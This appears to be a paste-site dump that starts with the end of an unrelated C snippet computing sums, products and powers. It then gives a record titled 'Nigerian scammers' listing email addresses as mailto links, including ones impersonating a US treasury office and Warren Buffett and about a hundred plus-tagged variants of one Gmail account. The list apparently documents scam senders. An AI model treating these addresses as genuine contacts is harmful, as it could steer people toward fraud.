    int prod = product(0, i) * (1 - (i % 2 == 0));

    tot = tot + (sum + prod);
  }

  return tot;
}

int power(int b, int e) {
  int res = 1;
  for (int i = 0; i < e; i++) {
    res = res * b;
  }

  return res;
}

int powrec(int b, int e) {
  if (e == 0) return 1;
  return b * powrec(b, e - 1);
}"
i6Wz4n7f,Nigerian scammers [9-11-3/2023],bombaires,AIMMS,Thursday 9th of November 2023 05:43:06 PM CDT,"<a href=""mailto:fed_paymt_treasury_usa_2013@live.com"">fed_paymt_treasury_usa_2013@live.com</a>
<a href=""mailto:warrenbuffett631@yahoo.com"">warrenbuffett631@yahoo.com</a>
<a href=""mailto:warrenbuffett63@yahoo.com"">warrenbuffett63@yahoo.com</a>
<a href=""mailto:warrenbuffett64@outlook.com"">warrenbuffett64@outlook.com</a>
<a href=""mailto:carla@worldwidebizleads.com"">carla@worldwidebizleads.com</a>
<a href=""mailto:mscarmanlapointe21@gmail.com"">mscarmanlapointe21@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+647@gmail.com"">mscarmanlapointe21+647@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18783@gmail.com"">mscarmanlapointe21+18783@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29595@gmail.com"">mscarmanlapointe21+29595@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30429@gmail.com"">mscarmanlapointe21+30429@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9815@gmail.com"">mscarmanlapointe21+9815@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26693@gmail.com"">mscarmanlapointe21+26693@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+11934@gmail.com"">mscarmanlapointe21+11934@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+27751@gmail.com"">mscarmanlapointe21+27751@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+23640@gmail.com"">mscarmanlapointe21+23640@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13802@gmail.com"">mscarmanlapointe21+13802@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18608@gmail.com"">mscarmanlapointe21+18608@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3718@gmail.com"">mscarmanlapointe21+3718@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16548@gmail.com"">mscarmanlapointe21+16548@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19640@gmail.com"">mscarmanlapointe21+19640@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32234@gmail.com"">mscarmanlapointe21+32234@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16900@gmail.com"">mscarmanlapointe21+16900@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29343@gmail.com"">mscarmanlapointe21+29343@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28522@gmail.com"">mscarmanlapointe21+28522@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13803@gmail.com"">mscarmanlapointe21+13803@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+23971@gmail.com"">mscarmanlapointe21+23971@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8152@gmail.com"">mscarmanlapointe21+8152@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30265@gmail.com"">mscarmanlapointe21+30265@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32520@gmail.com"">mscarmanlapointe21+32520@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32056@gmail.com"">mscarmanlapointe21+32056@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1682@gmail.com"">mscarmanlapointe21+1682@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26613@gmail.com"">mscarmanlapointe21+26613@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+12407@gmail.com"">mscarmanlapointe21+12407@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24444@gmail.com"">mscarmanlapointe21+24444@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+31817@gmail.com"">mscarmanlapointe21+31817@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13745@gmail.com"">mscarmanlapointe21+13745@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25574@gmail.com"">mscarmanlapointe21+25574@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5650@gmail.com"">mscarmanlapointe21+5650@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22368@gmail.com"">mscarmanlapointe21+22368@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28287@gmail.com"">mscarmanlapointe21+28287@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24475@gmail.com"">mscarmanlapointe21+24475@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18745@gmail.com"">mscarmanlapointe21+18745@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32369@gmail.com"">mscarmanlapointe21+32369@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19093@gmail.com"">mscarmanlapointe21+19093@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16860@gmail.com"">mscarmanlapointe21+16860@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10613@gmail.com"">mscarmanlapointe21+10613@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3521@gmail.com"">mscarmanlapointe21+3521@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19769@gmail.com"">mscarmanlapointe21+19769@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25648@gmail.com"">mscarmanlapointe21+25648@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25842@gmail.com"">mscarmanlapointe21+25842@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+14993@gmail.com"">mscarmanlapointe21+14993@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28811@gmail.com"">mscarmanlapointe21+28811@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+12932@gmail.com"">mscarmanlapointe21+12932@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10944@gmail.com"">mscarmanlapointe21+10944@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13932@gmail.com"">mscarmanlapointe21+13932@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+20504@gmail.com"">mscarmanlapointe21+20504@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8370@gmail.com"">mscarmanlapointe21+8370@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1718@gmail.com"">mscarmanlapointe21+1718@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22654@gmail.com"">mscarmanlapointe21+22654@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19363@gmail.com"">mscarmanlapointe21+19363@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+391@gmail.com"">mscarmanlapointe21+391@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1703@gmail.com"">mscarmanlapointe21+1703@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26789@gmail.com"">mscarmanlapointe21+26789@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24660@gmail.com"">mscarmanlapointe21+24660@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13550@gmail.com"">mscarmanlapointe21+13550@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+6407@gmail.com"">mscarmanlapointe21+6407@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19143@gmail.com"">mscarmanlapointe21+19143@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29238@gmail.com"">mscarmanlapointe21+29238@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4163@gmail.com"">mscarmanlapointe21+4163@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+20721@gmail.com"">mscarmanlapointe21+20721@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3701@gmail.com"">mscarmanlapointe21+3701@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3977@gmail.com"">mscarmanlapointe21+3977@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26920@gmail.com"">mscarmanlapointe21+26920@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13086@gmail.com"">mscarmanlapointe21+13086@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+578@gmail.com"">mscarmanlapointe21+578@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17911@gmail.com"">mscarmanlapointe21+17911@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19000@gmail.com"">mscarmanlapointe21+19000@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26393@gmail.com"">mscarmanlapointe21+26393@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13761@gmail.com"">mscarmanlapointe21+13761@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10710@gmail.com"">mscarmanlapointe21+10710@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29572@gmail.com"">mscarmanlapointe21+29572@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+21347@gmail.com"">mscarmanlapointe21+21347@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5893@gmail.com"">mscarmanlapointe21+5893@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17231@gmail.com"">mscarmanlapointe21+17231@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9813@gmail.com"">mscarmanlapointe21+9813@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22059@gmail.com"">mscarmanlapointe21+22059@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+15601@gmail.com"">mscarmanlapointe21+15601@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10165@gmail.com"">mscarmanlapointe21+10165@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16194@gmail.com"">mscarmanlapointe21+16194@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19426@gmail.com"">mscarmanlapointe21+19426@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+17686@gmail.com"">mscarmanlapointe21+17686@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30126@gmail.com"">mscarmanlapointe21+30126@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1437@gmail.com"">mscarmanlapointe21+1437@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3291@gmail.com"">mscarmanlapointe21+3291@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8604@gmail.com"">mscarmanlapointe21+8604@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22348@gmail.com"">mscarmanlapointe21+22348@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16753@gmail.com"">mscarmanlapointe21+16753@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8792@gmail.com"">mscarmanlapointe21+8792@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+21502@gmail.com"">mscarmanlapointe21+21502@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9246@gmail.com"">mscarmanlapointe21+9246@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5304@gmail.com"">mscarmanlapointe21+5304@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29753@gmail.com"">mscarmanlapointe21+29753@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4679@gmail.com"">mscarmanlapointe21+4679@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+7093@gmail.com"">mscarmanlapointe21+7093@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+191@gmail.com"">mscarmanlapointe21+191@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+4289@gmail.com"">mscarmanlapointe21+4289@gmail.com</a>"
